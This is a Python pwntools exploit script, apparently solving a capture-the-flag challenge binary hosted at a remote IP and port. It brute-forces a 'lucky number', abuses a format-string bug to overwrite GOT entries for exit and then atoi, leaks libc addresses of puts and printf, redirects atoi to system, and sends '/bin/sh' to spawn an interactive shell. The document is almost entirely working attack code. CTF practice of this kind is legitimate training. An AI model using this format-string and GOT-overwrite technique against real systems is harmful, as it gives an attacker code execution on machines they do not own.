#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL, c_uint32, c_uint64

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc6_2.35-0ubuntu3.8_amd64.so'
lib = CDLL(libc)
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '152.69.210.130', 2004

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# clock calls
# break *0x4012fe
# break *0x040149a

# get choice scanf
# break *0x401612

# 68 cmp 
# break *0x401625

# atoi
# break *0x4013f3

# guess cmp
# break *0x4014d2
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chal 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def recv_lucky_number():
    io.recvuntil(b'Lucky number: ')
    lucky_number = int(io.recvline().strip())
    return lucky_number

FMTSTR_FUNC = 0x401534
def exploit():
    global io
    lucky_number = 0x0

    tries = 0x1
    while lucky_number != 0x44:
        log.info("tries: %d", tries)
        tries += 1
        io = initialize()
        lucky_number = recv_lucky_number()
        if lucky_number != 0x44:
            io.close()
        else:
            if args.GDB:
                gdb.attach(io, gdbscript)

    payload = fmtstr_payload(6, {elf.got['exit']: FMTSTR_FUNC})
    io.sendline(b'+')
    io.sendlineafter(b'name', payload)

    payload =  b'%7$s'.ljust(8, b'\x00') + p64(elf.got['puts'])
    io.sendline(b'1')
    io.sendline(b'idk')
    io.sendlineafter(b'name', payload)
    puts = u64(io.recvline()[2:8].ljust(8, b'\x00'))

    payload =  b'%7$s'.ljust(8, b'\x00') + p64(elf.got['printf'])
    io.sendline(b'1')
    io.sendline(b'idk')
    io.sendlineafter(b'name', payload)
    printf = u64(io.recvline()[2:8].ljust(8, b'\x00'))

    # remote
    # [*] libc puts: 0x7b0c817ffe50
    # [*] libc printf: 0x7b0c817df6f0
    libc.address = puts - libc.sym['puts']
    payload = fmtstr_payload(6, {elf.got['atoi']: libc.sym['system']})
    io.sendline(b'1')
    io.sendline(b'idk')
    io.sendlineafter(b'name', payload)

    io.sendline(b'1')
    io.sendlineafter(b'guess:', b'/bin/sh')

    log.info("libc puts: %#x", puts)
    log.info("libc printf: %#x", printf)
    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()